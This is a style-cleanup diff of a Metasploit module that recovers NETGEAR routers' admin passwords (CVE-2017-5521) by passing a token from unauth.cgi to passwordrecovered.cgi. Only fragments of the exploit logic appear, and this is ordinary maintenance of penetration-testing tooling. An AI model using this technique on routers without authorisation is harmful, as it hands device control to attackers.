@@ -7,24 +7,23 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'NETGEAR Administrator Password Disclosure',
-      'Description'    => %q{
-        This module will collect the password for the `admin` user.
-        The exploit will not complete if password recovery is set on the router.
-        The password is received by passing the token generated from `unauth.cgi`
-        to `passwordrecovered.cgi`. This exploit works on many different NETGEAR
-        products. The full list of affected products is available in the 'References'
-        section.
-
-      },
-      'Author'         =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'NETGEAR Administrator Password Disclosure',
+        'Description' => %q{
+          This module will collect the password for the `admin` user.
+          The exploit will not complete if password recovery is set on the router.
+          The password is received by passing the token generated from `unauth.cgi`
+          to `passwordrecovered.cgi`. This exploit works on many different NETGEAR
+          products. The full list of affected products is available in the 'References'
+          section.
+        },
+        'Author' => [
           'Simon Kenin', # Vuln Discovery, PoC
-          'thecarterb'   # Metasploit module
+          'thecarterb' # Metasploit module
         ],
-      'References'     =>
-        [
+        'References' => [
           [ 'CVE', '2017-5521' ],
           [ 'URL', 'https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=18758' ],
           [ 'URL', 'https://thehackernews.com/2017/01/Netgear-router-password-hacking.html'],
@@ -32,13 +31,20 @@ class MetasploitModule < Msf::Auxiliary
           [ 'URL', 'https://pastebin.com/dB4bTgxz'],
           [ 'EDB', '41205']
         ],
-      'License'        => MSF_LICENSE
-    ))
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
-    [
-      OptString::new('TARGETURI', [true, 'The base path to the vulnerable application', '/'])
-    ])
+      [
+        OptString::new('TARGETURI', [true, 'The base path to the vulnerable application', '/'])
+      ]
+    )
   end
 
   # @return substring of 'text', usually a response from a server in this case
@@ -78,7 +84,7 @@ class MetasploitModule < Msf::Auxiliary
 
       r = send_request_cgi({
         'uri' => "/passwordrecovered.cgi",
-        'vars_get' => { 'id'  =>  token }
+        'vars_get' => { 'id' => token }
       })
 
       vprint_status("Sending request to #{rhost}/passwordrecovered.cgi?id=#{token}")
@@ -108,8 +114,7 @@ class MetasploitModule < Msf::Auxiliary
   # Almost every NETGEAR router sends a 'WWW-Authenticate' header in the response
   # This checks the response for that header.
   def check
-
-    res = send_request_cgi({'uri'=>'/'})
+    res = send_request_cgi({ 'uri' => '/' })
     if res.nil?
       fail_with(Failure::Unreachable, 'Connection timed out.')
     end
